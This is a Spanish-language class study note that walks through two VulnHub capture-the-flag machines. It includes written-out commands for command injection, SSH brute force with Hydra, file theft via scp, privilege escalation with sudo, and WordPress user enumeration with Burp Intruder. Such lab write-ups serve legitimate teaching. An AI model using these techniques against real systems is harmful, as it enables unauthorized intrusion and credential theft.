

> [!info] Relacionado con
> [[PrÃ¡cticas CTF - HTB y VulnHub]] Â· [[ExplotaciÃ³n de Servicios - Linux]] Â· [[Escalada de Privilegios]] Â· [[Reverse Shells y Post-ExplotaciÃ³n]] Â· [[Burp Suite - Framework de AuditorÃ­a]]
> â†’

---

## â‘  Flujo general de un CTF

```
Superficie expuesta â†’ EnumeraciÃ³n â†’ ExplotaciÃ³n â†’ Shell â†’ Enumerar dentro â†’ Escalada â†’ Root
```

> [!important] Idea central de la clase
> Lo que comprometemos primero suele ser una cuenta de servicio (ej: www-data), que casi no puede hacer nada. Desde ahÃ­ saltamos a cuentas de usuario (que sÃ­ tienen /home y permisos), de usuario a usuario las veces que haga falta, y finalmente a root. Ese salto final es la **escalada de privilegios**.

---

## â‘¡ RickdiculouslyEasy (VulnHub)

### Cadena completa

```
www-data (RCE web) â†’ summer (SSH:22222) â†’ Robo de ficheros â†’ Hydra â†’ RickSanchez â†’ sudo su â†’ root
```

| Puerto | Servicio | Hallazgo |
|--------|---------|---------|
| 21 | FTP anon | Login anÃ³nimo, flag.txt |
| 22 | Â«SSHÂ» falso | tcpwrapped â€” puerto muerto |
| 80 | Web | Command Injection en cgi-bin |
| 9090 | Cockpit | Rabbit hole â€” sin vector |
| 22222 | SSH real | El SSH autÃ©ntico |
| 60000 | TCP | Reverse shell parcial vÃ­a nc |

### Fase externa â€” comandos clave

```bash
# 1) Descubrir activos en la red
sudo netdiscover -r 10.0.2.0/24

# 2) Escaneo silencioso y luego scripts+versiones
nmap 10.0.2.15
nmap -sCV 10.0.2.15

# 3) Escaneo de TODOS los puertos
nmap -p- 10.0.2.15

# EnumeraciÃ³n de directorios de la web
dirsearch -u http://10.0.2.15

# Backdoor sin autenticaciÃ³n en el puerto 60000
nc 10.0.2.15 60000
```

> [!tip] RCE por concatenaciÃ³n de comandos
> El formulario que pedÃ­a una IP ejecutaba traceroute en el servidor. Al concatenar con `;` o `&&` (ej: `8.8.8.8; whoami`) el backend respondÃ­a como www-data, confirmando ejecuciÃ³n remota de comandos.

> [!info] La contraseÃ±a "winter"
> Con dirsearch apareciÃ³ un directorio `/passwords/`. La pÃ¡gina parecÃ­a vacÃ­a, pero en **ver cÃ³digo fuente** habÃ­a un comentario con la contraseÃ±a `winter`, que resultÃ³ ser del usuario summer.

### Acceso inicial por SSH

El SSH real no estÃ¡ en el 22, sino en el **22222**:

```bash
ssh summer@10.0.2.15 -p 22222
# ContraseÃ±a: winter
```

### EnumeraciÃ³n interna â€” checklist

```bash
# Usuarios del sistema
cat /etc/passwd

# Â¿QuÃ© puedo ejecutar como root sin contraseÃ±a?
sudo -l

# VersiÃ³n de kernel/SO
uname -a

# Buscar binarios con bit SUID (permiso 4000)
find / -perm -4000 2>/dev/null
```

> [!info] sudo -l vs SUID
> `sudo -l` lista los comandos que mi usuario puede ejecutar como root (reglas de grupo predefinidas). El **bit SUID** son ficheros concretos marcados para ejecutarse con los permisos de su propietario.

### Robo de ficheros entre usuarios

Desde summer se exploran los `/home` de los otros usuarios. Tenemos lectura sobre sus carpetas:

**Carpeta de RickSanchez â†’ binario "safe"**

```bash
cd /home/RickSanchez/RICKS_SAFE
ls -la
file safe # -> ejecutable (ELF)
./safe # pide argumentos: "use good command line arguments"
```

> [!warning] Permisos
> Sobre `safe` como summer solo tenÃ­amos `r` (lectura), no `x`. La soluciÃ³n es **copiarlo** a una carpeta nuestra (origen legible + destino escribible) y trabajarlo allÃ­.

**Carpeta de Morty â†’ imagen + zip**

En `/home/Morty` hay un `Safe_Password.jpg` y un `journal.txt.zip` protegidos. Nos los llevamos a nuestra Kali.

### Transferencia de ficheros: cp y scp

```bash
# Copia interna (mover a una carpeta donde tengo escritura):
cp /home/RickSanchez/RICKS_SAFE/safe /tmp/

# Traer ficheros de la vÃ­ctima a mi Kali (ojo al puerto 22222):
scp -P 22222 summer@10.0.2.15:/home/Morty/Safe_Password.jpg .
scp -P 22222 summer@10.0.2.15:/home/Morty/journal.txt.zip .
# (contraseÃ±a: winter)
```

> [!info] scp es bidireccional
> Igual que descargamos, podrÃ­amos **subir** a la vÃ­ctima invirtiendo origen y destino: `scp -P 22222 fichero.sh summer@10.0.2.15:/tmp/`

### AnÃ¡lisis de los ficheros robados

```bash
exiftool Safe_Password.jpg # metadatos: poca cosa relevante
strings Safe_Password.jpg # cadenas embebidas â†’ aparece una contraseÃ±a
```

> [!tip] strings: leer el "bajo nivel" de un fichero
> `strings` extrae las cadenas de texto legibles dentro de cualquier fichero (ejecutable, imagenâ€¦). En la imagen revelÃ³ una contraseÃ±a incrustada â€” tÃ©cnica relacionada con la **esteganografÃ­a**.

> [!warning] Confirmar la contraseÃ±a exacta
> La contraseÃ±a incrustada en la imagen se citÃ³ de oÃ­do como "music / MISIC"; al ser audio, conviene confirmarla con la cadena exacta que devuelve `strings` en pantalla.

### Descifrado del zip y del binario

```bash
unzip journal.txt.zip # pide la contraseÃ±a hallada
cat journal.txt # pista narrativa + una flag

# El binario safe, con sus argumentos correctos, suelta otra flag
./safe <argumento_de_la_imagen>
```

> [!tip] Pista clave: la polÃ­tica de contraseÃ±a de Rick
> Al resolver el binario aparece un **Rick's Password Hints**: su contraseÃ±a se compone de **una mayÃºscula + un dÃ­gito + una palabra del nombre de su antigua banda**.

### Generar diccionario + fuerza bruta SSH (Hydra)

La banda de Rick SÃ¡nchez es **The Flesh Curtains**. La palabra que entra en la contraseÃ±a es `Curtains`. Aplicando la regla se generÃ³ un diccionario de ~780 combinaciones:

```bash
# Estructura de hydra para SSH (ojo al puerto):
# -l usuario -L lista_usuarios
# -p contraseÃ±a -P lista_contraseÃ±as
hydra -l RickSanchez -P diccionario.txt ssh://10.0.2.15:22222
```

> [!tip] Credencial encontrada
> Hydra devolviÃ³ la contraseÃ±a de RickSanchez: `P7Curtains`. Encaja con la polÃ­tica: mayÃºscula + dÃ­gito + palabra de la banda.

### Escalada final a root

```bash
ssh RickSanchez@10.0.2.15 -p 22222 # contraseÃ±a: P7Curtains
whoami # RickSanchez
sudo -l # -> (ALL : ALL) ALL
sudo su # cambio a root
whoami # root
cat /root/*flag*
```

> [!info] Por quÃ© funciona sudo su sin la contraseÃ±a de root
> `sudo -l` indica `(ALL : ALL) ALL`, por lo que RickSanchez puede ejecutar cualquier comando como root **sin que se la pida**. Equivale a "ejecutar como administrador" en Windows cuando ya tienes el permiso concedido.

### Cadena completa de RickdiculouslyEasy

```
www-data (RCE web) â†’ summer (SSH:22222) â†’ Robo de ficheros â†’ Hydra â†’ RickSanchez â†’ sudo su â†’ root
```

---

## â‘¢ Mr. Robot (VulnHub) â€” inicio

> [!warning] MÃ¡quina sin terminar
> Solo se hizo el reconocimiento y el comienzo de la enumeraciÃ³n web. La fuerza bruta del panel de WordPress se dejÃ³ corriendo y se continÃºa en la prÃ³xima clase.

### Reconocimiento

```bash
sudo netdiscover -r 10.0.2.0/24 # localizar la IP de la vÃ­ctima
nmap -p- -sCV 10.0.2.7 # todos los puertos + versiones
```

| Puerto | Estado | Notas |
|--------|--------|-------|
| 22 | Cerrado | SSH no disponible |
| 80 | Abierto | Servidor web HTTP |
| 443 | Abierto | El 80 con capa SSL/TLS (HTTPS) |

> [!info] 80 vs 443
> El puerto 443 es esencialmente el puerto 80 con una capa de cifrado (certificado SSL/TLS). Por eso es habitual que el contenido sea el mismo y que 80 redirija a 443.

### EnumeraciÃ³n web y robots.txt

La web muestra una animaciÃ³n tipo terminal de la serie. Se enumera con dirsearch / feroxbuster:

| CÃ³digo | Significado |
|--------|------------|
| 200 | OK |
| 301 / 302 | RedirecciÃ³n |
| 403 | Prohibido |
| 404 | No encontrado |

> [!tip] Truco mnemotÃ©cnico
> Para recordar los cÃ³digos HTTP con gatitos: https://http.cat

```bash
# robots.txt
# http://10.0.2.7/robots.txt
User-agent: *
key-1-of-3.txt # <- primera flag
fsociety.dic # <- diccionario (~858.000 lÃ­neas)
```

> [!info] QuÃ© dice realmente robots.txt
> Indica a los crawlers quÃ© pueden indexar. Para un atacante es oro: suele listar rutas y ficheros que el dueÃ±o no querÃ­a visibles. AquÃ­ destapa una flag y un diccionario.

### Sanitizar el diccionario

```bash
wc -l fsocity.dic # ~858.000 lÃ­neas
sort fsocity.dic | uniq > fsocity_clean.dic
wc -l fsocity_clean.dic # ~11.452 lÃ­neas Ãºnicas
```

> [!tip] Por quÃ© importa
> Pasar de 858.000 a 11.452 lÃ­neas (~80 veces menos) reduce drÃ¡sticamente el tiempo de la fuerza bruta. Sanitizar siempre los diccionarios que saquemos de una mÃ¡quina es una buena prÃ¡ctica.

### WordPress + information disclosure

En `/wp-login.php` se observa una **fuga de informaciÃ³n** por los mensajes de error: si el usuario no existe responde "Invalid username"; si existe pero la contraseÃ±a falla, responde "incorrect password". Eso permite **enumerar usuarios**.

> [!warning] Information disclosure en logins
> Un login bien diseÃ±ado deberÃ­a dar un mensaje genÃ©rico ("usuario o contraseÃ±a incorrectos"). Cuando distingue entre "usuario invÃ¡lido" y "contraseÃ±a incorrecta", revela quÃ© usuarios existen.

### Burp Suite: interceptar y atacar

Se usa **Burp Suite** como proxy para interceptar las peticiones:

- **Proxy** â†’ Intercept ON: la peticiÃ³n queda retenida hasta que la liberamos con Forward
- **Repeater** (clic derecho â†’ Send to Repeater): reenvÃ­a una misma peticiÃ³n modificÃ¡ndola para ver la respuesta
- **Intruder** (modo Sniper): automatiza el envÃ­o masivo cambiando un parÃ¡metro con un diccionario

> [!info] AnatomÃ­a de la peticiÃ³n de login
> Es un POST a `/wp-login.php` porque enviamos datos a la base de datos. Campos relevantes: `log` (usuario) y `pwd` (contraseÃ±a). En la respuesta lo clave es la **longitud**: el error "invalid username" medÃ­a ~4065 bytes.

### Enumerar el usuario por longitud de respuesta

En Intruder se marca el campo de usuario como payload y se prueban candidatos:

| Usuario probado | Longitud respuesta | InterpretaciÃ³n |
|----------------|-------------------|----------------|
| admin / user / user1â€¦ | ~4065 bytes | "Invalid username" â†’ no existe |
| **Elliot** | **~4116 bytes** | Distinta â†’ "the password is incorrect" = **usuario vÃ¡lido** |

> [!tip] Resultado
> El usuario Elliot existe (longitud de respuesta distinta y mensaje de error diferente). El siguiente paso es repetir el ataque con Intruder sobre el campo `pwd`, usando el diccionario limpio.

### Cadena de Mr. Robot (hasta ahora)

```
nmap (80/443) â†’ robots.txt â†’ fsocity.dic â†’ Limpiar diccionario â†’ Enumerar usuario: Elliot â†’ Fuerza bruta pwd (pendiente)
```

> [!info] Sobre versiones de WordPress
> La fuga de informaciÃ³n usuario/contraseÃ±a no es un fallo de versiÃ³n: es una opciÃ³n de configuraciÃ³n del propietario en el panel de WordPress. Las versiones modernas vienen configuradas por defecto para no revelarlo.

---

## â‘£ Conceptos base: tipos de cuenta y permisos

### Tipos de cuenta en un sistema

| Tipo de cuenta | CaracterÃ­sticas | Ejemplos |
|---------------|----------------|----------|
| **Cuenta de servicio** | Creada para que corra un servicio en un puerto. Permisos muy reducidos sobre el sistema. Sin /home real, con nologin. | www-data, apache, ftp |
| **Cuenta de usuario** | Persona real del sistema. Tiene /home propio, shell (/bin/bash) y permisos de lectura/escritura en su espacio. | summer, Morty, RickSanchez |
| **Cuenta administrador** | MÃ¡xima autoridad. No usa /home, sino /root. | root |

> [!info] CÃ³mo leer /etc/passwd
> Cada lÃ­nea es un usuario. Lo importante son las dos Ãºltimas columnas: el **directorio** (si es /home/x o /root es un usuario legÃ­timo) y la **shell**. Si termina en `/bin/bash` puede usar terminal; si pone `/usr/sbin/nologin` es una cuenta de servicio sin acceso interactivo.

> [!tip] FTP anÃ³nimo â‰  acceso al sistema
> Que el FTP permita login anÃ³nimo no significa que el usuario ftp pueda entrar al sistema: esa cuenta solo accede a su propio servicio (su carpeta /srv/ftp), nunca a una shell.

### Permisos de fichero (owner / group / others)

Los permisos se leen en tres bloques â€” **propietario, grupo y otros** â€” cada uno con `r` (lectura), `w` (escritura) y `x` (ejecuciÃ³n).

> [!tip] Para copiar un fichero solo se necesitan dos cosas
> **Origen legible** â†’ permiso `r` sobre el fichero que quiero copiar. **Destino escribible** â†’ permiso `w` sobre la carpeta donde lo dejo.

> [!warning] La carpeta /tmp y el sticky bit
> `/tmp` tiene permisos de lectura, escritura y ejecuciÃ³n para todos (de ahÃ­ el color distinto en `ls`, por la "t" de sticky bit). Se usa tanto para subir y ejecutar herramientas cuando la cuenta comprometida no tiene un `/home` donde escribir.

---

## â‘¤ Herramientas de referencia

| Herramienta | Para quÃ© | Uso visto en clase |
|------------|---------|-------------------|
| **netdiscover** | Descubrir activos en la red local | `sudo netdiscover -r 10.0.2.0/24` |
| **nmap** | Escaneo de puertos / versiones | `nmap -sCV <ip>` Â· `nmap -p- <ip>` |
| **dirsearch / feroxbuster** | EnumeraciÃ³n de directorios web | `dirsearch -u http://<ip>` |
| **nc (netcat)** | Conexiones TCP crudas / shells | `nc 10.0.2.15 60000` |
| **ssh** | Acceso remoto | `ssh user@<ip> -p 22222` |
| **scp** | Copiar ficheros vÃ­a SSH | `scp -P 22222 user@<ip>:/ruta .` |
| **find (SUID)** | Buscar binarios privilegiados | `find / -perm -4000 2>/dev/null` |
| **strings / exiftool** | Inspeccionar ficheros e imÃ¡genes | `strings img.jpg` Â· `exiftool img.jpg` |
| **hydra** | Fuerza bruta de credenciales | `hydra -l user -P dic.txt ssh://<ip>:22222` |
| **sort | uniq** | Sanitizar diccionarios | `sort dic | uniq > dic_clean` |
| **Burp Suite + FoxyProxy** | AuditorÃ­a web (proxy/repeater/intruder) | EnumeraciÃ³n por longitud de respuesta |

---

## â‘¥ Resumen de mÃ¡quinas

| MÃ¡quina | OS | Cadena resumida |
|---------|----|----------------|
| **RickdiculouslyEasy** | Linux | RCE web â†’ SSH â†’ Robo ficheros â†’ Hydra â†’ sudo su |
| **Mr. Robot** | Linux | robots.txt â†’ Diccionario â†’ Enumerar usuario â†’ Fuerza bruta |

---

## Checklist de repaso

- [ ] Â¿Puedo describir la cadena de explotaciÃ³n completa de RickdiculouslyEasy?
- [ ] Â¿SÃ© transferir ficheros con scp (incluyendo el puerto -P)?
- [ ] Â¿Entiendo cÃ³mo exiftool/strings revelan metadatos y cadenas ocultas?
- [ ] Â¿SÃ© generar un diccionario a partir de pistas contextuales?
- [ ] Â¿Recuerdo que la cuenta FTP anÃ³nimo NO es acceso al sistema?
- [ ] Â¿Distingo cuentas de servicio vs usuarios vs administradores?
- [ ] Â¿SÃ© identificar usuarios reales en /etc/passwd (shell /bin/bash)?
- [ ] Â¿Entiendo cÃ³mo Burp Suite Intruder enumera usuarios por longitud de respuesta?
- [ ] Â¿Recuerdo sanitizar diccionarios con `sort | uniq`?
- [ ] Â¿Dejo siempre el listener antes de una reverse shell?

â†’

â†’

